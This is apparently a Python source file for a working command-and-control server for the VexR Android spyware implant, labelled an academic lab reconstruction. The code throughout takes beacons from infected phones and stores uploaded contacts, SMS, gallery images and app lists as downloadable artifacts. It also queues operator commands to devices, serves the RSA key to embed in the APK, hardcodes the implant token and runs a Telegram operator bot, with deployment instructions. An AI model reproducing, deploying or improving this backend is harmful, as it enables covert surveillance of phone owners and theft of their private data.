"""
VexR C2 Backend — Academic Lab Reconstruction
==============================================

Reconstructed from static analysis of D_Kyt7.apk (com.VexR.app v1.1).

The implant has three uplink transports and the server accepts all three:

  1. encrypted envelope   v=3&d=<AES-CBC>&k=<RSA(aesKey)>&i=<iv>   -> /panel.php
  2. plain form           action=heartbeat&Model=...&Device_id=...  -> /panel.php
     (the fallback sp0.e() takes when its RSA step returns null)
  3. raw file             the bytes verbatim, no encryption         -> /file.php
     (sp0.f(), used for EVERY command result: contacts, SMS, gallery, apps)

Layers:
  protocol.py  crypto + body classification
  store.py     SQLite schema, artifacts on disk, read models
  server.py    HTTP routes and the operator API (this file)
  dashboard.py the operator UI

Run:  uvicorn server:app --host 0.0.0.0 --port 8000
"""

from __future__ import annotations

import asyncio
import hmac
import html
import json
import logging
import os
import secrets
from typing import Any, Optional
from urllib.parse import parse_qs

from fastapi import FastAPI, HTTPException, Query, Request
from fastapi.responses import (
    FileResponse,
    HTMLResponse,
    JSONResponse,
    RedirectResponse,
    Response,
)
from pydantic import BaseModel

import store
from dashboard import DASHBOARD_HTML
from protocol import (
    ENCRYPTED,
    PLAIN_FORM,
    RAW_FILE,
    ProtocolError,
    classify,
    crypto,
    describe,
    parse_form,
)

AUTH_TOKEN = os.environ.get("VEXR_AUTH_TOKEN", "VexR_Lab_Academic_Token_2026")
SUDO_PORT = "EeILBT"  # from assets/sudoport.txt

app = FastAPI(
    title="VexR Lab C2", docs_url=None, redoc_url=None, openapi_url=None
)

COOKIE_NAME = "vexr_session"
OPERATOR_TOKEN = ""


def _resolve_operator_token() -> str:
    """Prefer the deployment secret; otherwise mint one and keep it in the DB."""
    token = os.environ.get("VEXR_OPERATOR_TOKEN", "").strip()
    if token:
        return token
    token = store.get_setting("operator_token")
    if token:
        return token
    token = secrets.token_urlsafe(32)
    store.set_setting("operator_token", token)
    store.log(
        "warning",
        "operator token generated (set VEXR_OPERATOR_TOKEN to choose your own): "
        f"{token}",
    )
    return token


@app.on_event("startup")
def _startup() -> None:
    global OPERATOR_TOKEN

    store.init_db()
    OPERATOR_TOKEN = _resolve_operator_token()
    store.log(
        "info",
        f"C2 started · db={store.DB_PATH} artifacts={store.ARTIFACT_DIR} "
        f"persistent={store.DB_PATH.parent != store.BASE_DIR}",
    )


# ---------------------------------------------------------------------------
# Telegram operator bot
# ---------------------------------------------------------------------------
# The bot runs inside the API process. A second Railway service is one more
# thing to misconfigure, while this service already deploys and has a working
# database. Set TELEGRAM_BOT=0 to turn it off.

_bot_task: Optional[asyncio.Task[None]] = None
_bot_log_handler: Optional[logging.Handler] = None


class _StoreLogHandler(logging.Handler):
    """Mirror bot log lines into the operator log, so /api/log shows them."""

    def emit(self, record: logging.LogRecord) -> None:
        try:
            message = record.getMessage()
            if record.exc_info:
                trace = logging.Formatter().formatException(record.exc_info)
                message += " | " + " ".join(trace.split())
            store.log(record.levelname.lower(), f"bot: {message}")
        except Exception:  # noqa: BLE001 - logging must never break the bot
            pass


def _on_bot_done(task: asyncio.Task[None]) -> None:
    if task.cancelled():
        store.log("info", "bot: task cancelled")
        return
    error = task.exception()
    if error is None:
        store.log("info", "bot: task finished")
    else:
        store.log("error", f"bot: task failed · {error.__class__.__name__}: {error}")


@app.on_event("startup")
async def _start_telegram_bot() -> None:
    global _bot_task, _bot_log_handler

    if os.environ.get("TELEGRAM_BOT", "1") == "0":
        store.log("info", "bot: disabled by TELEGRAM_BOT=0")
        return

    try:
        import bot as telegram_bot
    except Exception as exc:  # noqa: BLE001 - the API must still boot
        store.log("error", f"bot: import failed · {exc.__class__.__name__}: {exc}")
        return

    _bot_log_handler = _StoreLogHandler()
    telegram_bot.log.addHandler(_bot_log_handler)

    # Talk to ourselves over loopback: no public round trip, no TLS, and the
    # bot reads exactly the database this process serves.
    port = os.environ.get("PORT", "8000")
    _bot_task = asyncio.create_task(
        telegram_bot.serve(
            base_url=f"http://127.0.0.1:{port}",
            token=OPERATOR_TOKEN,
        ),
        name="telegram-bot",
    )
    _bot_task.add_done_callback(_on_bot_done)


@app.on_event("shutdown")
async def _stop_telegram_bot() -> None:
    global _bot_task, _bot_log_handler

    if _bot_task is not None:
        _bot_task.cancel()
        try:
            await _bot_task
        except asyncio.CancelledError:
            pass
        except Exception:  # noqa: BLE001 - already reported by the callback
            pass
        _bot_task = None

    if _bot_log_handler is not None:
        import bot as telegram_bot

        telegram_bot.log.removeHandler(_bot_log_handler)
        _bot_log_handler = None


# ---------------------------------------------------------------------------
# Operator auth
# ---------------------------------------------------------------------------
# AUTH_TOKEN below is the implant token: it is embedded in the APK and must
# keep working for /panel.php and /file.php. Everything an operator can read or
# change uses this separate secret instead, so leaking the APK does not expose
# the dashboard, the artifacts, or the command queue.

_LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VexR Lab C2 — Sign in</title>
<style>
*,*::before,*::after{box-sizing:border-box}
body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0a0d12;
  color:#e4e9f0;font-family:system-ui,-apple-system,'Segoe UI',sans-serif}
.card{width:min(92vw,390px);background:#12171f;border:1px solid #232c38;
  border-radius:12px;padding:28px}
h1{margin:0 0 6px;font-size:17px;font-weight:650;letter-spacing:-.01em}
h1 b{color:#3de8b0}
p{margin:0 0 20px;color:#9aa5b4;font-size:13px;line-height:1.55}
label{display:block;font-size:12px;color:#9aa5b4;margin-bottom:6px}
input{width:100%;padding:11px 12px;border-radius:8px;border:1px solid #2e3947;
  background:#1a212b;color:#e4e9f0;font:inherit;font-size:14px;outline:none}
input:focus{border-color:#3de8b0}
button{width:100%;margin-top:14px;padding:11px;border-radius:8px;border:0;
  background:#3de8b0;color:#06120e;font:inherit;font-weight:650;cursor:pointer}
button:hover{filter:brightness(1.05)}
.err{margin:0 0 14px;color:#f0564b;font-size:13px}
.hint{margin:16px 0 0;color:#5f6b7c;font-size:11.5px;line-height:1.5}
</style>
</head>
<body>
<form class="card" method="post" action="/api/login">
  <h1><b>VexR</b> Lab C2</h1>
  <p>This console is private. Enter the operator token to continue.</p>
  __ERROR__
  <label for="token">Operator token</label>
  <input id="token" name="token" type="password" autocomplete="current-password"
         autofocus required>
  <button type="submit">Sign in</button>
  <p class="hint">The token is printed once in the server log at first boot,
     or set VEXR_OPERATOR_TOKEN in the deployment.</p>
</form>
</body>
</html>
"""


def _login_page(error: str = "") -> str:
    note = f'<p class="err">{html.escape(error)}</p>' if error else ""
    return _LOGIN_HTML.replace("__ERROR__", note)


def _same(left: str, right: str) -> bool:
    return hmac.compare_digest(left.encode("utf-8"), right.encode("utf-8"))


def _operator_ok(request: Request) -> bool:
    if not OPERATOR_TOKEN:
        return False
    header = request.headers.get("X-Auth-Token", "")
    if header and _same(header, OPERATOR_TOKEN):
        return True
    cookie = request.cookies.get(COOKIE_NAME, "")
    return bool(cookie) and _same(cookie, OPERATOR_TOKEN)


@app.middleware("http")
async def _guard_operator(request: Request, call_next):
    path = request.url.path
    if path.startswith("/api/") and path not in (
        "/api/login",
        "/api/logout",
        "/api/publickey",
    ):
        if not _operator_ok(request):
            return JSONResponse({"detail": "unauthorized"}, status_code=401)
    elif path == "/" and not _operator_ok(request):
        return HTMLResponse(_login_page())
    return await call_next(request)


@app.post("/api/login")
async def api_login(request: Request):
    is_json = request.headers.get("content-type", "").startswith("application/json")
    if is_json:
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001 - malformed JSON is just a bad token
            body = {}
        token = str(body.get("token", ""))
    else:
        raw = await request.body()
        token = parse_qs(raw.decode("utf-8", "replace")).get("token", [""])[0]

    client = request.client.host if request.client else "?"

    if not token or not _same(token, OPERATOR_TOKEN):
        store.log("warning", f"operator login failed from {client}")
        await asyncio.sleep(0.4)
        if is_json:
            return JSONResponse({"detail": "wrong token"}, status_code=401)
        return HTMLResponse(_login_page("Wrong token."), status_code=401)

    store.log("info", f"operator login from {client}")
    response: Response
    if is_json:
        response = JSONResponse({"ok": True})
    else:
        response = RedirectResponse("/", status_code=303)
    response.set_cookie(
        COOKIE_NAME,
        OPERATOR_TOKEN,
        max_age=60 * 60 * 24 * 30,
        httponly=True,
        secure=True,
        samesite="strict",
        path="/",
    )
    return response


@app.post("/api/logout")
def api_logout():
    response = JSONResponse({"ok": True})
    response.delete_cookie(COOKIE_NAME, path="/")
    return response


# ---------------------------------------------------------------------------
# Implant auth
# ---------------------------------------------------------------------------

def _authorized(request: Request) -> bool:
    return request.headers.get("X-Auth-Token") == AUTH_TOKEN


def _fingerprint(value: Optional[str]) -> str:
    """Describe a token without writing it to the logs in the clear."""
    if not value:
        return "<absent>"
    import hashlib

    return f"len={len(value)} sha256={hashlib.sha256(value.encode()).hexdigest()[:16]}"


def _diagnose_rejection(request: Request) -> None:
    store.log(
        "warn",
        f"unauthorized request from {request.client.host if request.client else '?'} "
        f"token[{_fingerprint(request.headers.get('X-Auth-Token'))}] "
        f"expected[{_fingerprint(AUTH_TOKEN)}] "
        f"ua={request.headers.get('User-Agent', '')[:60]!r} "
        f"path={request.url.path}",
    )


# ---------------------------------------------------------------------------
# Uplink
# ---------------------------------------------------------------------------

@app.post("/panel.php")
async def panel(request: Request, p: str = Query(default=""), action: str = Query(default="")):
    """Beacon endpoint — accepts the encrypted envelope or the plain fallback."""
    if not _authorized(request):
        _diagnose_rejection(request)
        return JSONResponse({"status": "forbidden"}, status_code=403)

    body = await request.body()
    form = parse_form(body)

    try:
        uplink = classify(body, form)
    except ProtocolError as exc:
        store.log("error", f"panel parse failed: {exc} | {describe(body, form)}")
        return JSONResponse({"status": "error", "reason": str(exc)}, status_code=400)

    if uplink.transport == RAW_FILE:
        store.log("warn", f"file bytes posted to /panel.php ({len(body)}B) — ignored")
        return JSONResponse({"status": "error", "reason": "use /file.php"}, status_code=400)

    payload = uplink.payload
    device_key = store.register_device(payload)
    store.record_beacon(
        device_key,
        action or uplink.action,
        payload,
        "encrypted" if uplink.transport == ENCRYPTED else "plain",
    )

    pending = store.claim_pending_commands(device_key)
    store.log(
        "info",
        f"beacon action={action or uplink.action or '-'} device={device_key}"
        f" via={uplink.transport}" + (f" delivered={pending}" if pending else ""),
    )

    resp: dict[str, Any] = {"status": "ok"}
    if pending:
        resp["pending_commands"] = pending
    return JSONResponse(resp)


@app.post("/file.php")
async def file_upload(request: Request, p: str = Query(default="")):
    """Artifact endpoint — command results arrive here as raw bytes.

    sp0.f() encrypts nothing. It posts the file as the whole request body and
    puts its name in the URL (`?p=<sudo_port>&response=true&<gm1 fields>`), so
    the handler must never require an envelope.
    """
    if not _authorized(request):
        _diagnose_rejection(request)
        return JSONResponse({"status": "forbidden"}, status_code=403)

    body = await request.body()
    content_type = request.headers.get("Content-Type", "").split(";")[0].strip()
    query = dict(request.query_params)
    form = parse_form(body)

    # Prefer the encrypted envelope if this upload happens to be one.
    if form.get("v") == "3":
        try:
            uplink = classify(body, form)
            payload = uplink.payload
            device_key = store.register_device(payload)
            meta = store.store_artifact(
                device_key,
                payload.get("filename") or payload.get("name") or "upload.bin",
                json.dumps(payload).encode(),
                content_type or "application/json",
            )
            store.log("info", f"encrypted artifact device={device_key} name={meta['filename']}")
            return JSONResponse({"status": "ok", "id": meta["id"]})
        except ProtocolError as exc:
            store.log("error", f"encrypted artifact failed: {exc}")

    # Otherwise this is a raw upload from sp0.f(). Identify the device from the
    # query string the implant appended, or from a field inside a text result.
    device_key = (
        query.get("Device_id")
        or query.get("device_id")
        or form.get("Device_id")
        or form.get("device_id")
        or "unknown"
    )

    filename = (
        query.get("filename")
        or query.get("name")
        or query.get("action")
        or form.get("filename")
        or _guess_name(body, content_type)
    )

    # A heartbeat-shaped body is not a file; treat it as a beacon instead so a
    # misrouted request still records something useful.
    if not body:
        store.log("warn", "empty upload rejected")
        return JSONResponse({"status": "error", "reason": "empty"}, status_code=400)

    command_id = _match_command(device_key, filename)
    meta = store.store_artifact(device_key, filename, body, content_type, command_id)

    # Ensure the device row exists even for an upload that arrived first.
    if device_key != "unknown":
        store.register_device({"device_id": device_key})

    store.log(
        "info",
        f"artifact received device={device_key} name={meta['filename']}"
        f" kind={meta['kind']} size={meta['size_bytes']}"
        + (f" cmd={command_id}" if command_id else ""),
    )
    return JSONResponse({"status": "ok", "id": meta["id"]})


def _guess_name(body: bytes, content_type: str) -> str:
    """Derive a sensible filename when the implant did not supply one."""
    ext = {
        "image/jpeg": "jpg",
        "image/png": "png",
        "image/webp": "webp",
        "application/zip": "zip",
        "text/plain": "txt",
        "application/json": "json",
    }.get(content_type)
    if not ext:
        if body[:3] == b"\xff\xd8\xff":
            ext = "jpg"
        elif body[:8] == b"\x89PNG\r\n\x1a\n":
            ext = "png"
        elif body[:4] == b"PK\x03\x04":
            ext = "zip"
        else:
            ext = "bin"
    return f"upload.{ext}"


def _match_command(device_key: str, filename: str) -> Optional[int]:
    """Attach an upload to the command that most likely produced it."""
    with store.db() as conn:
        row = conn.execute(
            "SELECT id, command FROM commands WHERE device_key = ?"
            " AND status = 'sent' ORDER BY id DESC LIMIT 1",
            (device_key,),
        ).fetchone()
    return int(row["id"]) if row else None


# ---------------------------------------------------------------------------
# Operator API
# ---------------------------------------------------------------------------

class CommandIn(BaseModel):
    device_key: str
    command: str
    params: Optional[str] = None


@app.post("/api/command")
def api_queue_command(cmd: CommandIn):
    if not store.get_device(cmd.device_key):
        raise HTTPException(status_code=404, detail="unknown device")
    command_id = store.queue_command(cmd.device_key, cmd.command, cmd.params)
    store.log("info", f"command queued id={command_id} device={cmd.device_key} cmd={cmd.command}")
    return {"status": "queued", "id": command_id, "command": cmd.command}


@app.get("/api/devices")
def api_devices():
    return {"devices": store.list_devices()}


@app.get("/api/devices/{device_key}")
def api_device(device_key: str):
    device = store.get_device(device_key)
    if not device:
        raise HTTPException(status_code=404, detail="unknown device")
    return {
        "device": device,
        "beacons": store.list_beacons(50, device_key),
        "artifacts": store.list_artifacts(50, device_key),
        "commands": store.list_commands(50, device_key),
    }


@app.get("/api/beacons")
def api_beacons(limit: int = 100, device_key: Optional[str] = None):
    return {"beacons": store.list_beacons(limit, device_key)}


@app.get("/api/artifacts")
def api_artifacts(limit: int = 100, device_key: Optional[str] = None):
    return {"artifacts": store.list_artifacts(limit, device_key)}


@app.get("/api/commands")
def api_commands(limit: int = 100, device_key: Optional[str] = None):
    return {"commands": store.list_commands(limit, device_key)}


@app.get("/api/artifacts/{artifact_id}/download")
def api_download(artifact_id: int):
    with store.db() as conn:
        row = conn.execute("SELECT * FROM artifacts WHERE id = ?", (artifact_id,)).fetchone()
    if not row:
        raise HTTPException(status_code=404, detail="unknown artifact")
    path = store.artifact_path(row["stored_name"])
    if not path:
        raise HTTPException(status_code=410, detail="artifact file is gone")
    return FileResponse(
        path,
        filename=row["filename"],
        media_type=row["content_type"] or "application/octet-stream",
    )


@app.delete("/api/artifacts/{artifact_id}")
def api_delete_artifact(artifact_id: int):
    """Remove an artifact and its file. Used to discard probe traffic."""
    with store.db() as conn:
        row = conn.execute("SELECT * FROM artifacts WHERE id = ?", (artifact_id,)).fetchone()
        if not row:
            raise HTTPException(status_code=404, detail="unknown artifact")
        conn.execute("UPDATE commands SET artifact_id = NULL WHERE artifact_id = ?", (artifact_id,))
        conn.execute("DELETE FROM artifacts WHERE id = ?", (artifact_id,))
    path = store.artifact_path(row["stored_name"])
    if path:
        try:
            path.unlink()
        except OSError:
            pass
    store.log("info", f"artifact deleted id={artifact_id} name={row['filename']}")
    return {"status": "deleted", "id": artifact_id}


@app.get("/api/artifacts/{artifact_id}/preview")
def api_preview(artifact_id: int):
    """Inline view for text and image artifacts."""
    with store.db() as conn:
        row = conn.execute("SELECT * FROM artifacts WHERE id = ?", (artifact_id,)).fetchone()
    if not row:
        raise HTTPException(status_code=404, detail="unknown artifact")
    path = store.artifact_path(row["stored_name"])
    if not path:
        raise HTTPException(status_code=410, detail="artifact file is gone")

    ctype = row["content_type"] or ""
    if row["kind"] == "image" or ctype.startswith("image/"):
        return FileResponse(path, media_type=ctype or "image/jpeg")

    data = path.read_bytes()[:200_000]
    return Response(
        content=data.decode("utf-8", "replace"),
        media_type="text/plain; charset=utf-8",
    )


@app.get("/api/stats")
def api_stats():
    # Sweep here rather than on a background thread: the dashboard polls this
    # every 5 s, so a delivered-but-never-answered command stops showing as
    # "sent" within a minute of going stale.
    store.expire_stale_commands()
    return store.stats()


@app.get("/api/log")
def api_log(limit: int = 100):
    return {"log": store.list_log(limit)}


@app.get("/api/publickey")
def api_publickey():
    """The Base64 X.509 public key to embed in the APK."""
    return {"public_key": crypto.public_key_b64}


@app.get("/", response_class=HTMLResponse)
def dashboard():
    return HTMLResponse(DASHBOARD_HTML)


@app.get("/health")
def health():
    # Public for Railway's healthcheck. Deliberately says nothing else.
    return {"status": "ok"}
